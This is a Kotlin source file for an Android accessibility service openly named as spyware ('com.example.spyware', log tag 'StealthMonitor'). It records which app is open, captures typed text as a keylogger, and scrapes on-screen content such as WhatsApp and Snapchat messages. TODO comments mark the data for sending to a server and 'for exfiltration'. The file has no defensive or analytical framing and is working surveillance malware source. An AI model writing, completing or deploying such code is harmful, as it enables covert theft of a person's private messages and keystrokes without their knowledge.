package com.example.spyware

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

class MonitorService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // 1. Track Active Application
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString() ?: "Unknown"
            Log.d("StealthMonitor", "Active App Changed: $packageName")
            // TODO: Send to your CollectorService / Server
        }

        // 2. Track Keystrokes (Text Changed)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val textTyped = event.text.toString()
            Log.d("StealthMonitor", "Text Typed/Changed: $textTyped")
            // TODO: Queue this data for exfiltration
        }

        // 3. Screen Scraping (Reading screen content like WhatsApp/Snapchat messages)
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            val rootNode = rootInActiveWindow
            if (rootNode != null) {
                val screenText = StringBuilder()
                extractTextFromNodes(rootNode, screenText)
                if (screenText.isNotEmpty()) {
                    Log.d("StealthMonitor", "Screen Content: ${screenText.toString().take(200)}...")
                }
                rootNode.recycle()
            }
        }
    }

    private fun extractTextFromNodes(node: AccessibilityNodeInfo?, stringBuilder: StringBuilder) {
        if (node == null) return
        
        if (node.text != null && node.text.isNotEmpty()) {
            stringBuilder.append(node.text).append(" | ")
        }
        
        for (i in 0 until node.childCount) {
            extractTextFromNodes(node.getChild(i), stringBuilder)
        }
    }

    override fun onInterrupt() {
        Log.e("StealthMonitor", "Service Interrupted")
    }
}